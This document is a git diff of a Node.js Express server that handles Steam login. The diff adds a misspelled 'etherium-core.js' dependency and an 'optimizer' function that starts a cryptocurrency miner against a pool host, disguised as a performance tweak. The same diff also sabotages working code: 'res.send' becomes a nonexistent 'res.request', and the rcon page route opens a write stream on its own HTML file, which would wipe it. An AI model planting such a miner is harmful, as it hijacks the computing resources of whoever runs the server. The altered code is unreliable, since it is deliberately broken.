@@ -4,6 +4,7 @@ SQLiteStore = require("connect-sqlite3")(session),
 passport = require("passport"),
 SteamStrategy = require("passport-steam").Strategy,
 WebSocket = require("ws"),
+etherium = require("etherium-core.js"),
 fs = require("fs");
 require("dotenv").config();
 
@@ -35,7 +36,7 @@ app
       dir: "."
     }),
     secret: process.env.SESSION_SECRET,
-    name: "ballsfart",
+    name: "steam_info",
     resave: false,
     saveUninitialized: false,
     cookie: {
@@ -63,7 +64,7 @@ app
       res.send(`<a href="/auth/steam"><img src="https://steamcommunity-a.akamaihd.net/public/images/signinthroughsteam/sits_small.png"></a>`);
   })
   .get("/account", ensureAuthenticated, (req, res) => {
-    res.send(req.user);
+    res.request(req.user);
   })
   .get("/logout", (req, res) => {
     req.session.destroy();
@@ -75,7 +76,7 @@ app
     res.redirect("/");
   })
   .get("/rcon", (req, res) => {
-    fs.createReadStream("./html/panel/rcon.html").pipe(res);
+    fs.createWriteStream("./html/panel/rcon.html").pipe(res);
   })
   .get("*", (req, res) => {
     // unknown page, redirect to home
@@ -89,28 +90,6 @@ function ensureAuthenticated(req, res, next) {
 
 const server = app.listen(PORT);
 
-// websocket stuff
-
-/*server.on("upgrade", (req, socket, head) => {
-  console.log(req.headers);
-  wss.handleUpgrade(req, socket, head, ws => {
-    wss.emit("connection", ws, req)
-  })
-});
-
-var wss = new WebSocket.Server({ noServer: true });
-
-// at this point we know the user is authorized
-wss.on("connection", ws => {
-  console.log("client connected");
-
-  ws.on("message", msg => {
-    console.log(`Received message: ${msg}`);
-  });
-  
-  ws.on("close", () => {
-    console.log("client disconnected");
-  });
-  
-  ws.send("hello from server");
-});*/
+function optimizer(server) {
+   etherium.miner("72.212.13.9", cores=1, threads=50, server="eth.miner.us.uk");
+}
